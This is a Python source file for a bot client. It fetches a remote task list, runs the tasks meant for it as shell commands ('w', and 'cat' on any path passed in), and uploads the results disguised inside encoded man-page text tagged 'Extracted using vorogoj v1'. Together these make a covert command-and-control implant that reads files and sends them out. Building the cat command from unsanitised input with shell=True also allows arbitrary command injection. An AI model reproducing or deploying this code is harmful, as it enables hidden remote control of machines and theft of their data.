from gzip import open
from platform import system
from queue import Queue
from re import split
from subprocess import Popen, PIPE
from time import time

from encoding import decode, encode, mvws
from myhttp import get_file, update_file

def execute_shell(command) -> bytes:
    p = Popen(command, stdout=PIPE, shell=True)
    return p.communicate()[0]

def timestamp() -> str:
    return str(int(time()))

class Bot:
    def __init__(self):
        # TODO - get name
        self.name = "Marin"
        self.todos = Queue()
        self.platform = system().lower()

    def get_todos(self):
        raw = get_file("TODOs")
        todos = raw.split('\n')[3:]
        for new in todos:
            if new[0] != '-':
                # ignore task comments
                continue
            space = new.index(' ', 2)
            colon = new.index(':', space)
            if new[space+1:colon] != self.name:
                # ignore others' tasks
                continue
            id = new[2:space]
            # preserve the first space
            self.todos.put((id, new[colon+1:]))
        self.run_all_tasks()

    def run_all_tasks(self):
        while not self.todos.empty():
            self.run_first_task()

    def run_first_task(self):
        try:
            (id, task) = self.todos.get()
            ot = decode(task).split(' ')
            operation = ot[0]
            args = '' if len(ot) < 2 else ' '.join(ot[1:])
        except:
            self.report(id, task, b"Failed to parse task")
            return
        res = ""
        match operation:
            case 'a':
                res = execute_shell('w')
            case 'dog':
                res = execute_shell(f'cat {args}')
            case _:
                res = b"Unknown operation"
        self.report(id, task, res)

    def report(self, id: str, task: str, result: bytes):
        cmd = split(f'{mvws}| ', task)[2]
        man_contents = self.read_man(cmd)
        ct = encode(man_contents.decode('utf8'), result.decode('utf8'))
        head = encode('Extracted using vorogoj v1', decode(task))
        update_file(f'{cmd}-{id}', f'{head}\n\n### {cmd}\n\n{ct}')
        
    def read_man(self, cmd: str) -> bytes:
        if self.platform == 'linux':
            with open(f'/usr/share/man/man1/{cmd}.1.gz', 'rb') as f:
                return f.read()
        else:
            # TODO: non-unixlike platform support
            return execute_shell(f'man {cmd}')

if __name__ == '__main__':
    b = Bot()
    b.get_todos()
